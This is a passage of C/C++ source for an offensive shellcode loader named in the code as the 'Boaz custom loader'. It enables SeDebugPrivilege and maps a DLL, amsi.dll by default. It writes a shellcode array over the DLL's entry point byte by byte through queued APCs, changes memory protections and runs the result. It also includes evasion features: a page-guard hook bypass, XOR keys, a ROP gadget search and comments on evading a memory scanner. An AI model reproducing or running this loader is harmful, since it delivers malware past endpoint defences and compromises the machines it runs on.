                printf("[+] Queue Apc Ex2 Writing start byte 0x%02X to address %p\n", byte, (void*)((BYTE*)pAddress + i));
            } else {
                printf("[+] Queue Apc Ex2 Writing end byte 0x%02X to address %p\n", byte, (void*)((BYTE*)pAddress + i));
            }
        }
        // no Ex:
        // ULONG result  = pNtQueueApcThread(hThread, pRtlFillMemory, pAddress + i, (PVOID)1, (PVOID)(ULONG_PTR)byte); 
        // if (result != STATUS_SUCCESS) {
        //     printf("[-] Failed to queue APC. NTSTATUS: 0x%X\n", result);
        //     TerminateThread(hThread, 0);
        //     CloseHandle(hThread);
        //     return 1;
        // }
        // Ex:

        //pRtlFillMemory can be replaced with memset or memmove
        NTSTATUS result = pNtQueueApcThread(
        hThread, // ThreadHandle remains the same
        NULL, // UserApcReserveHandle is not used in the original call, so pass NULL
        apcFlags, // Whatever you like 
        pRtlFillMemory, // ApcRoutine remains the same
        (PVOID)(pAddress + i), // SystemArgument1: Memory address to fill, offset by i, as before
        (PVOID)1, // SystemArgument2: The size argument for RtlFillMemory, as before
        (PVOID)(ULONG_PTR)byte // SystemArgument3: The byte value to fill, cast properly, as before
        );
        if (result != STATUS_SUCCESS) {
            printf("[-] Failed to queue APC Ex2. NTSTATUS: 0x%X\n", result);
            TerminateThread(hThread, 0);
            CloseHandle(hThread);
            return 1;
        } else {
            // printf("[+] APC Ex2 queued successfully\n");
        }

    }

    // Resume the thread to execute queued APCs and then wait for completion
    if(!bUseCreateThreadpoolWait){


        // TODO, Change state: 
        /// print the address of above functions: 
        // printf("[+] NtCreateThreadStateChange: %p\n", NtCreateThreadStateChange);
        // printf("[+] NtChangeThreadState: %p\n", NtChangeThreadState);
        // printf("[+] NtCreateProcessStateChange: %p\n", NtCreateProcessStateChange);
        // printf("[+] NtChangeProcessState: %p\n", NtChangeProcessState);

        // HANDLE ThreadStateChangeHandle = NULL;
        // NTSTATUS status = NtCreateThreadStateChange(
        //     &ThreadStateChangeHandle, // This handle is used in NtChangeThreadState
        //     MAXIMUM_ALLOWED,            // Define the access you need
        //     NULL,                      // ObjectAttributes, typically NULL for basic usage
        //     hThread,              // Handle to the thread you're working with
        //     0                          // Reserved, likely 0 for most uses
        // );
        // if (status != STATUS_SUCCESS) {
        //     printf("[-] Failed to create thread state change: %x\n", status);
        //     return 1;
        // } else {
        //     printf("[+] Thread state change created\n");
        // }   
        
        // NTSTATUS status = NtCreateProcessStateChange(
        //     &ThreadStateChangeHandle, // This handle is used in NtChangeThreadState
        //     MAXIMUM_ALLOWED,            // Define the access you need
        //     NULL,                      // ObjectAttributes, typically NULL for basic usage
        //     hProcess,              // Handle to the thread you're working with
        //     0                          // Reserved, likely 0 for most uses
        // );
        // if (status != STATUS_SUCCESS) {
        //     printf("[-] Failed to create process state change: %x\n", status);
        //     return 1;
        // } else {
        //     printf("[+] Process state change created\n");
        // }
        // status = NtChangeThreadState(ThreadStateChangeHandle, duplicateThreadHandle, 2, NULL, 0, 0);
        // if (status != STATUS_SUCCESS) {
        //     printf("[-] Failed to resume thread: %x\n", status);
        //     return 1;
        // } else {
        //     printf("[+] Thread resumed\n");
        // };

        // print the ThreadStateChangeHandle->ThreadSuspendCount
        // getchar();
        // status = NtChangeThreadState(ThreadStateChangeHandle, hThread, 2, 0, 0, 0);
        // if (status != STATUS_SUCCESS) {
        //     printf("[-] Failed to resume thread: %x\n", status);
        //     return 1;
        // } else {
        //     printf("[+] Thread resumed\n");
        // };

        // status = NtChangeProcessState(ThreadStateChangeHandle, hProcess, 0, NULL, 0, 0);
        // if (status != STATUS_SUCCESS) {
        //     printf("[-] Failed to resume process: %x\n", status);
        //     return 1;
        // } else {
        //     printf("[+] Process resumed\n");
        // };

        // status = NtChangeProcessState(ThreadStateChangeHandle, hProcess, 1, NULL, 0, 0);
        // if (status != STATUS_SUCCESS) {
        //     printf("[-] Failed to resume process: %x\n", status);
        //     return 1;
        // } else {
        //     printf("[+] Process resumed\n");
        // };

        DWORD count = ResumeThread(hThread);
        printf("[+] Resuming thread %lu to write bytes\n", count);
        WaitForSingleObject(hThread, INFINITE);
        printf("[+] press any key to continue\n");
        getchar();
    } else {
        // Create a thread pool wait object
        PTP_WAIT ptpWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)pRtlFillMemory, NULL, NULL);
        // PTP_WAIT ptpWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)ExitThread, NULL, NULL);

        if (ptpWait == NULL) {
            printf("[-] Failed to create thread pool wait object: %lu\n", GetLastError());
            return 1;
        }

        // Associate the wait object with the thread pool
        SetThreadpoolWait(ptpWait, event, NULL);
        printf("[+] Thread pool wait object created\n");
        // WaitForSingleObject(event, INFINITE);
        WaitForThreadpoolWaitCallbacks(ptpWait, FALSE);
        // CreateThreadpoolWait
        // SetThreadpoolWait
        // WaitForThreadpoolWaitCallbacks
        // CloseThreadpoolWait
    }   

    printf("[+] APC write completed\n");

    if(!bUseCreateThreadpoolWait){
        /// The code below is not necessary, however, provided an "insurance".
        /// alert test need a alertable thread, which means if thread is alerted, we need resume thread to 
        /// make it alertable again. 
        // PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)pAddress;
        // myNtTestAlert testAlert = (myNtTestAlert)dynamic::NotGetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert");
        // NTSTATUS result = pNtQueueApcThread(
        //     hThread,  
        //     NULL,  
        //     apcFlags,  
        //     (PVOID)apcRoutine,  
        //     (PVOID)0,  
        //     (PVOID)0,  
        //     (PVOID)0 
        //     );

        // if(!testAlert) {
        //     printf("[-] Failed to locate alert test nt.\n");
        //     return 1;
        // } else {
        //     printf("[+] Alert tested\n");
        // }
    }

    // CloseHandle(hThread);
    return 0;
}


BOOL EnableWindowsPrivilege(const wchar_t* Privilege) {
    HANDLE token;
    TOKEN_PRIVILEGES priv;
    BOOL ret = FALSE;
    wprintf(L" [+] Enable %ls adequate privilege\n", Privilege);

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        priv.PrivilegeCount = 1;
        priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        // if (LookupPrivilegeValue(NULL, Privilege, &priv.Privileges[0].Luid) != FALSE &&
        if (LookupPrivilegeValueW(NULL, Privilege, &priv.Privileges[0].Luid) != FALSE &&
            AdjustTokenPrivileges(token, FALSE, &priv, 0, NULL, NULL) != FALSE) {
            ret = TRUE;
        }

        if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) { // In case privilege is not part of token (e.g. run as non-admin)
            ret = FALSE;
        }

        CloseHandle(token);
    }

    if (ret == TRUE)
        wprintf(L" [+] Success\n");
    else
        wprintf(L" [-] Failure\n");

    return ret;
}

///////ROP Trampoline search function: 
#ifdef _WIN64
BYTE * JMP_RAX_OPCODE = (BYTE*)"\xff\xe0";
// deinf JMP R11 opcode:
BYTE * JMP_R11_OPCODE = (BYTE*)"\x41\xff\xe3";
#else
BYTE * JMP_EAX_OPCODE = (BYTE*)"\xff\xe0";
#endif

VOID* foundRemoteAddress = NULL;
VOID searchForROPGadget();
VOID* ScanTargetProcessMemory(DWORD processID, BYTE* targetData, MEMORY_BASIC_INFORMATION
searchParams);

char* binarySearchString(BYTE* buffer, const char* targetData, size_t bufferSize) {
    char* ptr = (char*) buffer;
    size_t targetLength = strlen(targetData);

    if (targetLength == 0) return nullptr;

    for (size_t i = 0; i <= bufferSize - targetLength; ++i) {
        if (memcmp(ptr + i, targetData, targetLength) == 0) {
            return ptr + i;
        }
    }

    return nullptr;
}



////////////////////////////////////////

unsigned char magiccode[] = ####SHELLCODE####;

int main(int argc, char *argv[])
{
    printf("Starting Boaz custom loader...\n");
    if (!EnableWindowsPrivilege(L"SeDebugPrivilege")) {
        printf("[-]Failed to enable SeDebugPrivilege. You might not have sufficient permissions.\n");
    } else {
        printf("[+] SeDebugPrivilege enabled.\n");
    }


    // Default value for bTxF
    BOOL bTxF = FALSE, bUseCustomDLL = FALSE; // Flag to indicate whether to search for a suitable DLL
    int dllOrder = 1; // Default to the first suitable DLL

    BOOL bUseRtlCreateUserThread = FALSE, bUseCreateThreadpoolWait = FALSE; // Default to FALSE
    BOOL bUseLdrLoadDll = FALSE; // Default to FALSE
    BOOL bUseDotnet = FALSE; // Default to FALSE
    BOOL bUseNoAccess = FALSE; // Default to FALSE
    BOOL bUseAddPebList = FALSE; // Default to FALSE


    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0) {
            PrintUsageAndExit();
            return 0; 
        }
        
        if (i + 1 < argc && strcmp(argv[i], "-dll") == 0) {
            dllOrder = atoi(argv[i + 1]);
            bUseCustomDLL = TRUE;
            i++; // Skip next argument as it's already processed
        } else if (strcmp(argv[i], "-txf") == 0) {
            bTxF = TRUE;
        } else if (strcmp(argv[i], "-thread") == 0) {
            bUseRtlCreateUserThread = TRUE;
        } else if (strcmp(argv[i], "-pool") == 0) {
            bUseCreateThreadpoolWait = TRUE;
        } else if (strcmp(argv[i], "-ldr") == 0) {
            bUseLdrLoadDll = TRUE;
        } else if (strcmp(argv[i], "-peb") == 0) {
            bUseAddPebList = TRUE;
        } else if (strcmp(argv[i], "-dotnet") == 0) {
            if(bUseCustomDLL) {
                bUseDotnet = TRUE;
            } else {
                printf("[-] -dotnet flag can only be used after -dll flag. Exiting.\n");
                return 1;
            }
        } else if (strcmp(argv[i], "-a") == 0) {
            bUseNoAccess = TRUE;
        } else {
            printf("[-] Invalid argument: %s\n", argv[i]);
            return 1;
        }

        // Check for mutual exclusivity early
        if (bUseCreateThreadpoolWait && bUseRtlCreateUserThread) {
            printf("[-] Both -thread and -pool flags cannot be used together. Exiting.\n");
            return 1;
        }
    }


    if(bUseCreateThreadpoolWait) {
        printf("[+] Using CreateThreadpoolWait function for APC write.\n");
    } else {
        // print whether use alternative thread calling function, printf which method will be used:
        printf("[+] Using %s thread calling function.\n", bUseRtlCreateUserThread ? "RtlCreateUserThread" : "NtCreateThreadEx for APC write.");
    }

    // Display debug message about transaction mode
    printf("[+] Transaction Mode: %s\n", bTxF ? "Enabled" : "Disabled");

    // if (bUseNoAccess) {
    //     printf("[+] No access mode enabled to evade Moneta scanner.\n");
    // }

    LoadNtFunctions(); // Load the NT functions

    wchar_t dllPath[MAX_PATH] = {0}; // Buffer to store the path of the chosen DLL

    // bool useDotnet = TRUE; //This option can be made available to commandline options TODO: 
    if (bUseCustomDLL) {
        DWORD requiredSize = sizeof(magiccode); // Calculate the required size based on the magiccode array size
        printf("[+] Required size: %lu bytes\n", requiredSize);

        // Attempt to find a suitable DLL, now passing the calculated requiredSize
        if (!FindSuitableDLL(dllPath, sizeof(dllPath) / sizeof(wchar_t), requiredSize, bTxF, dllOrder, bUseDotnet)) {
            wprintf(L"[-] No suitable DLL found in the specified order. Falling back to default.\n");
            wcscpy_s(dllPath, L"C:\\windows\\system32\\amsi.dll"); // Default to amsi.dll
        } else {
            // wprintf(L"Using DLL: %s\n", dllPath);
        }
    } else {
        printf("[-] No custom DLL specified. Falling back to amsi.dll.\n");
        wcscpy_s(dllPath, L"C:\\windows\\system32\\amsi.dll"); // Use the default amsi.dll
    }

    wprintf(L"[+] Using DLL: %ls\n", dllPath);
    wprintf(L"[+] TxF Mode: %ls\n", bTxF ? L"Enabled" : L"Disabled");

    /// deal with TxF argument
    HANDLE fileHandle;
    if (bTxF) {
        OBJECT_ATTRIBUTES ObjAttr = { sizeof(OBJECT_ATTRIBUTES) };
        HANDLE hTransaction;
        NTSTATUS NtStatus = NtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, &ObjAttr, nullptr, nullptr, 0, 0, 0, nullptr, nullptr);
        if (!NT_SUCCESS(NtStatus)) {
            printf("[-] Failed to create transaction (error 0x%x)\n", NtStatus);
            return 1;
        }

        // Display debug message about creating transaction
        printf("[+] Transaction created successfully.\n");
        
        fileHandle = CreateFileTransactedW(dllPath, GENERIC_READ, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr, hTransaction, nullptr, nullptr);
        // fileHandle = CreateFileTransactedW(dllPath, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr, hTransaction, nullptr, nullptr);
        if (fileHandle == INVALID_HANDLE_VALUE) {
            printf("[-] Failed to open DLL file transacted. Error: %lu\n", GetLastError());
            CloseHandle(hTransaction);
            return 1;
        }

        // Display debug message about opening DLL file transacted
        printf("[+] DLL file opened transacted successfully.\n");
    } else {
        fileHandle = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (fileHandle == INVALID_HANDLE_VALUE) {
            printf("[-] Failed to open DLL file. Error: %lu\n", GetLastError());
            return 1;
        }

        // Display debug message about opening DLL file
        printf("[+] DLL file opened successfully.\n");
    }

    LONG status = 0;
    HANDLE fileBase = NULL;
    HANDLE hSection = NULL;

    if(bUseLdrLoadDll) {
        printf("[+] Using LdrLoadDll function.\n");

        UNICODE_STRING UnicodeDllPath;
        ManualInitUnicodeString(&UnicodeDllPath, dllPath);
        NTSTATUS status = LdrLoadDll(NULL, 0, &UnicodeDllPath, &fileBase);  // Load the DLL

        if (NT_SUCCESS(status)) {
            printf("[!] LdrLoadDll loaded successfully.\n");
        } else {
            printf("[-] LdrLoadDll failed. Status: %x\n", status);
        }
    } else {

        printf("[+] Using DLL with missing PEB (NtCreateSection and NtMapViewOfSection).\n");
        // Create a section from the file
        // LONG status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, fileHandle);
        status = NtCreateSection(&hSection, SECTION_MAP_READ, NULL, NULL, PAGE_READONLY, SEC_IMAGE, fileHandle);
        if (status != 0) {
            printf("NtCreateSection failed. Status: %x\n", status);
            CloseHandle(fileHandle);
            return 1;
        }

        // Map the section into the process
        // PVOID fileBase = NULL;
        SIZE_T viewSize = 0;
        status = NtMapViewOfSection(hSection, GetCurrentProcess(), (PVOID*)&fileBase, 0, 0, NULL, &viewSize, 1, 0, PAGE_READONLY);
        if (status != 0) {
            printf("NtMapViewOfSection failed. Status: %x\n", status);
            CloseHandle(hSection);
            CloseHandle(fileHandle);
            return 1;
        }
    }

    printf("[!] Before add our module to the PEB lists. \n");
    printf("[!] press any key to continue\n");
    getchar();
    if(!bUseLdrLoadDll) {
        if(bUseAddPebList) {
            const wchar_t* dllName = GetDllNameFromPath(dllPath);

            bool bAddModuleToPEB = AddModuleToPEB((PBYTE)fileBase, dllPath, (LPWSTR)dllName, (ULONG_PTR)fileBase);
            if(bAddModuleToPEB) {
                printf("[+] AddModuleToPEB succeeded\n");
                wprintf(L"DLL %ls added to PEB lists\n", dllPath);
            } else {
                printf("[-] AddModuleToPEB failed\n");
            }
            printf("[!] press any key to continue\n");
            getchar();
        }
    }




    // for NtCreateSection and NtMapViewOfSection
    // PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBase;
    // PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBase + dosHeader->e_lfanew);
    // DWORD entryPointRVA = ntHeader->OptionalHeader.AddressOfEntryPoint;


    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBase;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBase + dosHeader->e_lfanew);
    DWORD entryPointRVA = ntHeader->OptionalHeader.AddressOfEntryPoint;

    // Size of the DLL in memory
    SIZE_T dllSize = ntHeader->OptionalHeader.SizeOfImage;

    // Load the DLL to get its base address in current process
    // HMODULE hDll = LoadLibraryW(dllPath); //Normal loading
    // HMODULE hDll = dynamic::loadFuture(dllPath); //invisible loading

    // if (hDll == NULL) {
    //     printf("Failed to load DLL. Error: %lu\n", GetLastError());
    //     if(bUseLdrLoadDll) {
    //         UnmapViewOfFile(fileBase);
    //     } else {
    //         UnmapViewOfFile(fileHandle);
    //         UnmapViewOfFile(fileBase);
    //         CloseHandle(hSection);
    //     }
    //     return 1;
    // } else { 
	// 	printf("[+] DLL loaded.\n");
	// }

    // Calculate the AddressOfEntryPoint in current process
    // LPVOID dllEntryPoint = (LPVOID)(entryPointRVA + (DWORD_PTR)hDll);
	// printf("[+] DLL entry point: %p\n", dllEntryPoint);
    
    PVOID dllEntryPoint = (PVOID)(entryPointRVA + (DWORD_PTR)fileBase);
	// printf("[+] DLL entry point: %p\n", dllEntryPoint);
    wprintf(L"DLL %ls added to PEB lists\n", dllPath);

    // Overwrite the AddressOfEntryPoint with magiccode
    // SIZE_T bytesWritten;
    // BOOL result = WriteProcessMemory(GetCurrentProcess(), dllEntryPoint, magiccode, sizeof(magiccode), &bytesWritten);

    ///////////////////////////// Let's get the memory protection of the target DLL's entry point before any modification: 
    HANDLE hProcess = GetCurrentProcess();
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T result;

    // result = VirtualQueryEx(hProcess, dllEntryPoint, &mbi, sizeof(mbi));

    // if (result == 0) {
    //     printf("VirtualQueryEx failed. Error: %lu\n", GetLastError());
    // } else {
    //     printf("[+] Default memory protection in target DLL is: %s\n", ProtectionToString(mbi.Protect));
    // }

    SIZE_T magiccodeSize = sizeof(magiccode);
    dll_len = magiccodeSize; //This can be the size of .text section, which will be less suspicious...

    printf("[**] magiccodeSize: %lu\n", magiccodeSize);

    printf("[*] dllEntryPoint: %p\n", dllEntryPoint);

    // DWORD oldProtect = 0;
    // if (!VirtualProtectEx(hProcess, dllEntryPoint, magiccodeSize, PAGE_READWRITE, &oldProtect)) {
    //     printf("VirtualProtectEx failed to change memory protection. Error: %lu\n", GetLastError());
    //     CloseHandle(hProcess);
    //     return 1;
    // }

    // if (!VirtualProtect(dllEntryPoint, magiccodeSize, PAGE_READWRITE, &oldProtect)) {
    //     printf("VirtualProtect failed to change memory protection. Error: %lu\n", GetLastError());
    //     CloseHandle(hProcess);
    //     return 1;
    // }

    // NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)dynamic::NotGetProcAddress(GetModuleHandleA("ntdll"), "NtProtectVirtualMemory");
    //use the normal way:
    // NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(GetModuleHandleA("ntdll"), "NtProtectVirtualMemory");


    PVOID baseAddress = dllEntryPoint; // BaseAddress must be a pointer to the start of the memory region
    SIZE_T regionSize = magiccodeSize; // The size of the region
    ULONG oldProtect;

    //####END####


    
    status = NtProtectVirtualMemory(
        hProcess,
        &baseAddress, // NtProtectVirtualMemory expects a pointer to the base address
        &regionSize, // A pointer to the size of the region
        PAGE_READWRITE, // The new protection attributes 
        &oldProtect); // The old protection attributes

    if(status != STATUS_SUCCESS) {
        printf("NtProtectVirtualMemory failed to change memory protection. Status: %x\n", status);
        return 1;
    } else {
        printf("[+] Memory protection after before was: %s\n", ProtectionToString(oldProtect));
    }
    // printf("[+] Default memory protection before change in target DLL was: %s\n", ProtectionToString(oldProtect));

    if (hProcess != NULL) {
        result = WriteProcessMemoryAPC(hProcess, (BYTE*)dllEntryPoint, (BYTE*)magiccode, magiccodeSize, bUseRtlCreateUserThread, bUseCreateThreadpoolWait); 
    }

    // if (!VirtualProtectEx(hProcess, dllEntryPoint, magiccodeSize, oldProtect, &oldProtect)) {
    //     printf("[-] VirtualProtectEx failed to restore original memory protection. Error: %lu\n", GetLastError());
    // }

    // if (!VirtualProtect(dllEntryPoint, magiccodeSize, oldProtect, &oldProtect)) {
    //     printf("[-] VirtualProtect failed to restore original memory protection. Error: %lu\n", GetLastError());
    // }

    /// NtProtectVirtualMemory cause Modified code flags in .text and .rdata section in the target DLL.

    ULONG Protect = PAGE_EXECUTE_READ;
    // if(bUseNoAccess) {
    //     Protect = PAGE_NOACCESS;
    // }

    

    status = NtProtectVirtualMemory(
        hProcess,
        &baseAddress, // NtProtectVirtualMemory expects a pointer to the base address
        &regionSize, // A pointer to the size of the region
        Protect, // The new protection attributes, PAGE_EXECUTE_READ
        // PAGE_EXECUTE_WRITECOPY, 
        &oldProtect); // The old protection attributes
    if(status != STATUS_SUCCESS) {
        printf("[-] NtProtectVirtualMemory failed to restore original memory protection. Status: %x\n", status);
    } else {
        printf("[+] Memory protection before change was: %s\n", ProtectionToString(oldProtect));
    }
    //print both in hex and in string in one line:
    printf("[+] Original memory protection was: %s (0x%08X)\n", ProtectionToString(oldProtect), oldProtect);
        
    

    if (result) {
        printf("Failed to APC write magiccode. Error: %lu\n", GetLastError());
        // FreeLibrary(hDll);
        // CloseHandle(hSection);
        UnmapViewOfFile(fileBase);
        // CloseHandle(fileMapping);
        // CloseHandle(fileHandle);
        // return 1;
    } else {
		printf("[+] Magic code written with APC write.\n");
        printf("[+] press any key to continue\n");
        getchar();
        // SimpleSleep(10000);
	}

    // if(bUseNoAccess) {
    //     // //change the memory protection back to PAGE_EXECUTE_READ:
    //         status = NtProtectVirtualMemory(
    //         hProcess,
    //         &baseAddress, // NtProtectVirtualMemory expects a pointer to the base address
    //         &regionSize, // A pointer to the size of the region
    //         PAGE_EXECUTE_READ, // The new protection attributes, PAGE_EXECUTE_READ
    //         // PAGE_EXECUTE_WRITECOPY, 
    //         &oldProtect); // The old protection attributes
    //     if(status != STATUS_SUCCESS) {
    //         printf("[-] NtProtectVirtualMemory failed to restore original memory protection. Status: %x\n", status);
    //     } else {
    //         printf("[+] Memory protection before change was: %s\n", ProtectionToString(oldProtect));
    //     }
    // }


    PIMAGE_DOS_HEADER dosHeader1 = (PIMAGE_DOS_HEADER)fileBase;
    PIMAGE_NT_HEADERS ntHeader1 = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBase + dosHeader1->e_lfanew);
    DWORD entryPointRVA1 = ntHeader1->OptionalHeader.AddressOfEntryPoint;
    // //Write to .text section
    dllEntryPoint1 = (PVOID)(entryPointRVA1 + (DWORD_PTR)fileBase);
    

    // PIMAGE_TLS_CALLBACK *callback_decoy;
    // PIMAGE_DATA_DIRECTORY tls_entry_decoy = &ntHeader1->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];

    // if(tls_entry_decoy->Size) {
    //     PIMAGE_TLS_DIRECTORY tls_dir_decoy = (PIMAGE_TLS_DIRECTORY)((unsigned long long int)fileBase + tls_entry_decoy->VirtualAddress);
    //     callback_decoy = (PIMAGE_TLS_CALLBACK *)(tls_dir_decoy->AddressOfCallBacks);
    //     for(; *callback_decoy; callback_decoy++)
    //         (*callback_decoy)((LPVOID)fileBase, DLL_PROCESS_ATTACH, NULL);
    // }

    if(!bUseNoAccess) {
        // Use function pointer to call the DLL entry point 2nd time.
        DLLEntry DllEntry1 = (DLLEntry)((unsigned long long int)fileBase + entryPointRVA1);
        (*DllEntry1)((HINSTANCE)fileBase, DLL_PROCESS_ATTACH, 0);
    } else {
    

    // // Create a thread at dll entry point and execute it: 
    // HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dllEntryPoint1, NULL, 0, NULL);
    // if (hThread == NULL) {
    //     printf("Failed to create remote thread: %lu\n", GetLastError());
    //     return 1;
    // } else {
    //     printf("[+] Remote thread created.\n");
    // }

    // WaitForSingleObject(hThread, INFINITE);

	// HANDLE new_thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, NULL);
    // use NtCreateThreadEx to call dllEntryPoint:
    // HANDLE new_thread = NULL;
    // NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
    // if (!pNtCreateThreadEx) {
    //     printf("[-] Failed to locate NtCreateThreadEx.\n");
    //     // return 1;
    // } else {
    //     printf("[+] Located NtCreateThreadEx.\n");
    // }
    // status = pNtCreateThreadEx(
    //     &new_thread,
    //     NT_CREATE_THREAD_EX_ALL_ACCESS,
    //     NULL,
    //     hProcess,
    //     (PVOID)dllEntryPoint1, ///Change this to a decoy and restore the real one upon breakpoint
    //     NULL,
    //     NT_CREATE_THREAD_EX_SUSPENDED,
    //     0,
    //     0,
    //     0,
    //     NULL);

    
    // if (new_thread == NULL) {
    //     printf("[-] NtCreateThreadEx failed: %d\n", GetLastError());
    //     // return -1;
    // } else {
    //     printf("[+] NtCreateThreadEx succeeded.\n");
    // }
    //resume thread:
    // DWORD count = ResumeThread(new_thread);
    
    // CONTEXT thread_context = { 0 };
    // thread_context.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;
    // g_thread_handle = new_thread;
        // DWORD tebThreadID = GetCurrentThreadID_TEB();
        // DWORD apiThreadID = GetCurrentThreadId();

        // printf("Thread ID from TEB: %lu\n", tebThreadID);
        // printf("Thread ID from GetCurrentThreadId: %lu\n", apiThreadID);

        // if (tebThreadID == apiThreadID) {
        //     printf("Both methods return the same thread ID.\n");
        // } else {
        //     printf("The thread IDs are different!\n");
        // }

        printf("[!] Start syscall breakpoints memory guard with Decoy address, PAGE_NOACCESS and XOR \n");
        // pNtResumeThread = (NtResumeThread_t)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "NtResumeThread");
        // generate random encoding/decoding key
        for (int i = 0; i < 16; i++) {
            r = rand();
            key[i] = (char) r;
        }
        // BypassHookUsingBreakpoints();
        // BypassHookUsingForcedException();
        BypassHookUsingPageGuard();
    }
    // HANDLE new_thread = NULL;
    // NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
    // if (!pNtCreateThreadEx) {
    //     printf("[-] Failed to locate NtCreateThreadEx.\n");
    //     // return 1;
    // } else {
    //     printf("[+] Located NtCreateThreadEx.\n");
    // }
    // status = pNtCreateThreadEx(
    //     &g_thread_handle,
    //     NT_CREATE_THREAD_EX_ALL_ACCESS,
    //     NULL,
    //     hProcess,
    //     (PVOID)dllEntryPoint1, ///Change this to a decoy and restore the real one upon breakpoint
    //     NULL,
    //     0, //NT_CREATE_THREAD_EX_SUSPENDED,
    //     0,
    //     0,
    //     0,
    //     NULL);

    
    // if (g_thread_handle == NULL) {
    //     printf("[-] NtCreateThreadEx failed: %d\n", GetLastError());
    //     // return -1;
    // } else {
    //     printf("[+] NtCreateThreadEx succeeded.\n");
    // }

    // g_thread_handle = new_thread;
    
    // CloseHandle(hThread);
    // FreeLibrary(hDll);
    // if(bUseLdrLoadDll) {
    //     UnmapViewOfFile(fileBase);
    // } else {
    //     UnmapViewOfFile(fileHandle);
    //     UnmapViewOfFile(fileBase);
    //     CloseHandle(hSection);
    // }
    // CloseHandle(fileMapping);
    // CloseHandle(fileHandle);
    // CloseHandle(hSection);
    // Terminate the process
    // ExitProcess(0);
    return 0;


}



BOOL PrintSectionDetails(const wchar_t* dllPath) {
    HANDLE hFile = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"Failed to open file %ls for section details. Error: %lu\n", dllPath, GetLastError());
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* fileBuffer = (BYTE*)malloc(fileSize);
    if (!fileBuffer) {
        CloseHandle(hFile);
        wprintf(L"Memory allocation failed for reading file %ls.\n", dllPath);
        return FALSE;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, fileBuffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        free(fileBuffer);
        CloseHandle(hFile);
        wprintf(L"Failed to read file %ls. Error: %lu\n", dllPath, GetLastError());
        return FALSE;
    }

    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)fileBuffer;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(fileBuffer + dosHeader->e_lfanew);
    wprintf(L"Details for %ls:\n", dllPath);
    wprintf(L"  Size of Image: 0x%X\n", ntHeaders->OptionalHeader.SizeOfImage); // Print Size of Image
    IMAGE_SECTION_HEADER* sectionHeaders = (IMAGE_SECTION_HEADER*)((BYTE*)ntHeaders + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + ntHeaders->FileHeader.SizeOfOptionalHeader);

    wprintf(L"Details for %ls:\n", dllPath);
    wprintf(L"  Number of sections: %d\n", ntHeaders->FileHeader.NumberOfSections);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        IMAGE_SECTION_HEADER* section = &sectionHeaders[i];
        wprintf(L"  Section %d: %.*S\n", i + 1, IMAGE_SIZEOF_SHORT_NAME, section->Name);
        wprintf(L"    Virtual Size: 0x%X\n", section->Misc.VirtualSize);
        wprintf(L"    Virtual Address: 0x%X\n", section->VirtualAddress);
        wprintf(L"    Size of Raw Data: 0x%X\n", section->SizeOfRawData);
    }

    free(fileBuffer);
    CloseHandle(hFile);
    return TRUE;
}



// Syscall breakpoints handler with memory scan evasion: 

VOID searchForROPGadget() {
    // Create a function calls: 
    MEMORY_BASIC_INFORMATION memRestriction = { 0 };
    memRestriction.State = MEM_COMMIT;
    memRestriction.Type = MEM_IMAGE;
    memRestriction.Protect = PAGE_EXECUTE_READ;
    printf("[+] Looking for ROP gadget. \n");
    // foundRemoteAddress = ScanTargetProcessMemory(GetCurrentProcessId(), JMP_RAX_OPCODE, memRestriction);
    foundRemoteAddress = ScanTargetProcessMemory(GetCurrentProcessId(), JMP_R11_OPCODE, memRestriction);

    if (foundRemoteAddress) {
        printf("[+] Found ROP gadget at address: %p\n", foundRemoteAddress);
    } else {
